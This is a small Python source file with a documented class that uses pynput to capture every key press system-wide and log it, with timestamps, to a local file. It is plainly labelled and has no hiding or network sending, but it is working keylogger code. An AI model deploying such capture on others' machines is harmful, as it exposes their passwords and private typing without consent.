import logging
import os
from pynput import keyboard

class KeystrokeLogger:
    def __init__(self, log_file='keystrokes.log'):
        """
        Initialize the KeystrokeLogger.
        
        :param log_file: Path to the log file where keystrokes will be recorded
        """
        # Ensure the log directory exists
        os.makedirs(os.path.dirname(log_file) or '.', exist_ok=True)
        
        # Configure logging
        logging.basicConfig(
            filename=log_file, 
            level=logging.INFO, 
            format='%(asctime)s - %(message)s'
        )
        self.logger = logging.getLogger()
        
        # Keyboard listener
        self.listener = None

    def on_press(self, key):
        """
        Callback method for key press events.
        
        :param key: The key that was pressed
        """
        try:
            # Try to log the key character
            char = key.char
            self.logger.info(f'Key pressed: {char}')
        except AttributeError:
            # For special keys like 'shift', 'ctrl', etc.
            self.logger.info(f'Special key pressed: {key}')

    def start_logging(self):
        """
        Start logging keystrokes.
        
        :return: The keyboard listener
        """
        # Create a listener that captures key press events
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        return self.listener

    def stop_logging(self):
        """
        Stop logging keystrokes.
        """
        if self.listener:
            self.listener.stop()
            self.listener = None